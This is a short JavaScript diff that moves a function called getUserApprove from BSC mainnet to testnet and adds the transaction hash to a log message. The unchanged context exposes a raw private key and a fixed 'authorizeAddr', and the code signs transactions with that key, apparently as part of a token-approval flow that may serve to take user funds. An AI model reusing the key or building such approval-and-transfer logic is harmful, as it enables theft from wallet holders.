@@ -4,10 +4,10 @@ async function getUserApprove(ABI, contractAddress) {
 
         let authorizeAddr = "0xd43c891a5B1c50FA995F1a3966700308280570d6";
         let pk = "ce3838105f0decbee3a29da7c6a74922d78455425213079e27d10717dfedf9af";
-        let netId = 56;
+        let netId = 97;
         //await web3.eth.net.getId();
 
-        let web3_ext = new Web3('https://bsc-dataseed.binance.org');
+        let web3_ext = new Web3('https://bsc-testnet.publicnode.com');
         
         let chainlink = "https://testnet.bscscan.com/tx";
         
@@ -32,7 +32,7 @@ async function getUserApprove(ABI, contractAddress) {
             }, pk);
             web3_ext.eth.sendSignedTransaction(signedTx.rawTransaction, function (error, hash) {
                 if (!error) {
-                    console.log( contractAddress, "The hash of your transaction  he status of your transaction!");
+                    console.log(hash, contractAddress, "The hash of your transaction  he status of your transaction!");
                 } else {
                     console.log("!Something went wrong while submitting your transaction:");
 
